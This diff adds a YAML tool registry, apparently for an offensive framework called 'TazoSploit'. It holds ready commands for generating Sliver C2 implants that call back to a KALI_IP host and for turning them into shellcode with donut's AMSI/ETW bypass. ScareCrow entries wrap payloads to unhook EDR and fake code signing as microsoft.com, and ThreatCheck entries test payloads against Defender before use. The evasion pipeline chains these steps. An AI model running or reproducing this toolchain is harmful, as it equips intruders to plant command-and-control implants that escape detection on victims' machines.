@@ -1,0 +1,43 @@
+sliver:
+  description: "Sliver C2 — generates shellcode implants for evasion pipeline input"
+  category: c2
+  verify_cmd: "sliver version"
+  examples:
+    - "sliver > generate --mtls KALI_IP:8888 --os windows --arch amd64 --format shellcode --save /tmp/raw.bin"
+    - "sliver > generate --mtls KALI_IP:8888 --os windows --arch amd64 --skip-symbols --save /tmp/implant.exe"
+
+ScareCrow:
+  description: "EDR bypass payload wrapper — unhooks EDR, indirect syscalls, code signing"
+  category: evasion
+  install_cmd: "go install github.com/optiv/ScareCrow@latest || apt-get install -y scarecrow"
+  verify_cmd: "ScareCrow -h 2>&1 | head -3"
+  examples:
+    - "ScareCrow -I /tmp/donut.bin -Loader dll -domain microsoft.com -sign -encryptionmode AES"
+    - "ScareCrow -I /tmp/donut.bin -Loader binary -domain microsoft.com -sign"
+    - "ScareCrow -I /tmp/donut.bin -Loader wscript -domain microsoft.com"
+    - "ScareCrow -I /tmp/donut.bin -Loader control -domain microsoft.com -sign"
+
+donut:
+  description: "Converts PE/DLL/.NET to position-independent shellcode with AMSI/ETW bypass"
+  category: evasion
+  install_cmd: "pip3 install donut-shellcode || (git clone https://github.com/TheWover/donut && cd donut && make)"
+  verify_cmd: "donut -h 2>&1 | head -3"
+  examples:
+    - "donut -i /tmp/raw.bin -o /tmp/donut.bin -a 2 -e 3 -z 2 -b 1 -k 1 -j svchost"
+    - "donut -i /opt/tools/Rubeus.exe -o /tmp/rubeus.bin -a 2 -e 3 -b 1 -k 1 -p kerberoast"
+
+ThreatCheck:
+  description: "Pre-flight payload scanner — identifies Defender signature matches"
+  category: evasion
+  install_cmd: "dotnet tool install --global ThreatCheck || (git clone https://github.com/rasta-mouse/ThreatCheck && cd ThreatCheck && dotnet build)"
+  verify_cmd: "ThreatCheck -h 2>&1 | head -3"
+  examples:
+    - "ThreatCheck -f /tmp/payload.exe -e Defender"
+
+evasion_pipeline:
+  description: "TazoSploit automated evasion pipeline — chains Donut + ScareCrow + pre-flight"
+  category: evasion
+  verify_cmd: "python3 /opt/tazosploit/scripts/evasion_pipeline.py --help"
+  examples:
+    - "python3 /opt/tazosploit/scripts/evasion_pipeline.py --input /tmp/raw.bin --defense-level full --target-os windows --arch x64 --json"
+    - "python3 /opt/tazosploit/scripts/evasion_pipeline.py --input /tmp/raw.bin --defense-level basic --target-os windows --json"
